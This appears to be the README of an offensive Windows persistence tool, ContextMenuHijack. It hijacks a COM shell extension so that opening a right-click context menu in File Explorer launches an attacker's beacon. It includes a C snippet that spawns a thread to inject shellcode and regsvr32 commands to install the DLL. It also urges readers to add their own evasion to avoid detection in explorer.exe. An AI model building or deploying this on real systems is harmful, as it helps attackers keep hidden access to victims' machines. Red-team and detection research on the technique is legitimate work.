# ContextMenuHijack

This original idea that inspired me is from [@NinjaParanoid](https://twitter.com/NinjaParanoid) :

[![Video](https://user-images.githubusercontent.com/75935486/212143342-bda8da88-b076-488f-a3c2-126a4875c2c1.png)](https://www.youtube.com/watch?v=SwdmijpSjjA&ab_channel=ChetanNayak)


[ContextMenuHijack](https://github.com/RistBS/ContextMenuHijack) is a simple persistence technique that use COM hijacking based on human behavior, when you right click on a file/folder in the File Explorer to open the Context Menu, it executes at the same time the beacon we specified.
```c
IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID ) {
    DWORD tid = NULL;
    CreateThread(NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)InjectShc, NULL, 0, &tid);

    if (NULL == pDataObj) {
	if (pidlFolder != NULL) {
	}
        return S_OK;
    }
    return S_OK;
}
```

### Usage

You just have to load the solution file (.sln) and build it. It's important to know that you need **adminstrator privileges** to use this persistence technique. Once you have done all of this, you just have to register the DLL file in the registry with `regsvr32`:

```powershell
regsvr32 "C:\path\to\ContextMenuHijack.dll"
```

> if you want to uninstall it just use `/u` flag
```powershell
regsvr32 /u "C:\path\to\ContextMenuHijack.dll"
```

- this technique can be easily detected from the thread stack of `explorer.exe`, it is up to you to use your own evasion tradecraft 
![image](https://user-images.githubusercontent.com/75935486/212399032-3249579d-fff5-42e7-b18b-b3e7d13efaad.png)


# Credits

- https://github.com/rikka0w0/ExplorerContextMenuTweaker
- https://learn.microsoft.com/en-us/windows/win32/shell/how-to-implement-the-icontextmenu-interface?redirectedfrom=MSDN
- https://www.codeproject.com/Articles/441/The-Complete-Idiot-s-Guide-to-Writing-Shell-Extens
